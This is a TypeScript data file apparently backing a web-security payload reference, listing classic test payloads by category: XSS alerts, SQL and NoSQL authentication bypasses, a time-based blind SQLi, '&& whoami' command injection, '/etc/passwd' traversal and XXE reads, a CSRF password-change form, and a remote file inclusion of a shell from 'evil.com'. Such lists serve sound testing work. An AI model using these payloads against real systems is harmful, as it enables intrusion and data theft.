export const CATEGORIES = [
  "XSS",
  "SQLi",
  "CMDi",
  "SSTI",
  "LFI",
  "RFI",
  "XXE",
  "CSRF",
  "NoSQLi",
  "OpenRedirect",
] as const;

export type Category = typeof CATEGORIES[number];

export type Payload = {
  payload: string;
  description: string;
  tags: string[];
};

export const PAYLOAD_DATA: Record<Category, Payload[]> = {
  XSS: [
    {
      payload: "<script>alert(1)</script>",
      description: "Basic reflected XSS alert test.",
      tags: ["reflected"],
    },
    {
      payload: "<svg/onload=alert(1)>",
      description: "SVG-based XSS bypass for HTML filters.",
      tags: ["bypass"],
    },
  ],

  SQLi: [
    {
      payload: "' OR '1'='1' -- ",
      description: "Authentication bypass SQL injection.",
      tags: ["auth-bypass"],
    },
    {
      payload: "' OR sleep(5)--",
      description: "Time-based blind SQL injection.",
      tags: ["blind", "time-based"],
    },
  ],

  CMDi: [
    {
      payload: "&& whoami",
      description: "Command injection to identify execution user.",
      tags: ["basic"],
    },
  ],

  SSTI: [
    {
      payload: "{{7*7}}",
      description: "Template engine test payload.",
      tags: ["basic"],
    },
  ],

  LFI: [
    {
      payload: "../../../../../etc/passwd",
      description: "Linux passwd file inclusion test.",
      tags: ["file-read"],
    },
  ],

  RFI: [
    {
      payload: "http://evil.com/shell.txt",
      description: "Remote file inclusion payload.",
      tags: ["remote"],
    },
  ],

  XXE: [
    {
      payload:
        `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
      description: "Basic XXE file disclosure payload.",
      tags: ["file-read"],
    },
  ],

  CSRF: [
    {
      payload:
        `<form action="https://victim.com/change" method="POST"><input name="pass" value="hacked"></form>`,
      description: "Auto-submit CSRF password change PoC.",
      tags: ["poc"],
    },
  ],

  NoSQLi: [
    {
      payload: `{ "$ne": null }`,
      description: "MongoDB NoSQL authentication bypass.",
      tags: ["auth-bypass"],
    },
  ],

  OpenRedirect: [
    {
      payload: "https://evil.com",
      description: "Basic open redirect payload.",
      tags: ["redirect"],
    },
  ],
};
